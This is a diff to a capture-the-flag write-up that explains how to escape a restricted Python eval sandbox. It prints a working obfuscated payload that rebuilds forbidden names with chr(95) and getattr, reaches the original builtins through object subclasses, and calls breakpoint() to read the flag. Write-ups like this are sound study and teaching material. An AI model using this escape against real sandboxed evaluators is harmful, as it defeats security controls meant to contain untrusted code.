@@ -65,7 +65,7 @@ if __name__ == "__main__":
 ().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]()
 ```
 
-This payload navigates Python's internal structures to reference the original __builtins__ module not the restricted version provided in the script.
+Since we have a custom builtins that restrices us from doing pretty much anything, the idea is mainly to find a payload that can access the original builtins. This payload navigates Python's internal structures to reference the original __builtins__ module not the restricted version provided in the script.
 But first we need to find replacements for `_ [ ] .` and other words like `class register builtins breakpoint`.
 The main key is to exploit the custom builtins set in our `safe_eval` function. Pretty much `print int float` are kinda usless in our case ( maybe print is useful to test ). We can notice that we have the `getattr` function which if you google it you can already find that it can replaces `.` to accessing attributes.
 Another thing in our custom builtins we notice the `chr` function which we can use to replace the `_` by just using `chr(95)`, so now 2 of our major problems are done. 
@@ -79,7 +79,7 @@ to:
  ```python
 getattr(getattr(getattr(getattr(getattr(getattr(getattr((), chr(95) + chr(95) + 'cl'+'ass' + chr(95) + chr(95)), chr(95) + chr(95) + 'cl'+'ass' + chr(95) + chr(95)), chr(95) + chr(95) + 'subcl'+'asses' + chr(95) + chr(95))(getattr(getattr((), chr(95) + chr(95) + 'cl'+'ass' + chr(95) + chr(95)), chr(95) + chr(95) + 'cl'+'ass' + chr(95) + chr(95))), chr(95) + chr(95) + 'get'+'item' + chr(95) + chr(95))(0), 'regi'+'ster'), chr(95) + chr(95) + 'buil'+'tins' + chr(95) + chr(95)), chr(95) + chr(95) + 'get'+'item' + chr(95) + chr(95))('break'+'point')()
 ```
-After using the brekpoint() function and starting the debugger we can just open our flag 
+After using the breakpoint() function and starting the debugger we can just open our flag 
 ![Alt text](/flag.png)
 
  ```python
